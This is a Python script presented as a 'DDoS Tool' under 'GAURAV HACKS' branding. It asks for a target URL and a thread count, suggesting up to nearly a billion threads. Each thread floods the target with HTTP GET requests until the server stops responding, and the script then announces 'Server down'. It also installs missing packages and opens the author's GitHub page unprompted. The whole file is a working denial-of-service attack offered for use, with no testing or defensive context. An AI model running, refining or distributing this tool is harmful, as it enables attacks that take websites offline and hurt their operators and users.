import threading
import requests
import time
import sys
import webbrowser
import pyfiglet
from fake_useragent import UserAgent
import subprocess
import pkg_resources

# Function to check and install missing libraries
def install_libraries():
    required_libraries = ['requests', 'pyfiglet', 'fake_useragent']
    installed = {pkg.key for pkg in pkg_resources.working_set}
    missing = [lib for lib in required_libraries if lib not in installed]
    
    if missing:
        print(f"\033[31;mMissing libraries: {', '.join(missing)}")
        for lib in missing:
            print(f"Installing {lib}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

# Ensure required libraries are installed
install_libraries()

E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
F = '\033[1;32m'  # Ø§Ø®Ø¶Ø±
B = "\033[1;30m"  # Black
R = "\033[1;31m"  # Red
G = "\033[1;32m"  # Green
Y = "\033[1;33m"  # Yellow
Bl = "\033[1;34m"  # Blue
P = "\033[1;35m"  # Purple
C = "\033[1;36m"  # Cyan
W = "\033[1;37m"  # White
PN = "\033[1;35m"  # PINK

def to(s):
    for char in s + "\n":
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(100.0 / 8000)

to(pyfiglet.figlet_format('GAURAV  HACKS'))
print('\033[32;m         DDoS Tool By    GauravKrKalindi\n')

webbrowser.open("https://github.com/GauravKumarKalindi/")

def send_request(url, attempt_limit=50):
    fail_count = 0
    while fail_count < attempt_limit:
        try:
            response = requests.get(url)
            fail_count = 0  # Reset the fail count after a successful request
        except requests.exceptions.RequestException as e:
            fail_count += 1
            print(f"{E}Error: {e}")
            if fail_count >= attempt_limit:
                print(f"\033[31;mServer down !! Follow me")
                break
            else:
                time.sleep(1)  # wait before trying again to avoid overloading

def launch_attack(url, num_threads):
    # Only show attacking message once at the beginning
    print(f"\033[32;mStarting the attack on {url} with {num_threads} threads...\n")

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request, args=(url,))
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    target_url = input("\033[36;mEnter Target Link=>>\033[32;m")
    num_threads = int(input("\033[36;mEnter number of threads (suggested: 200-999999999): \033[32;m"))

    launch_attack(target_url, num_threads)
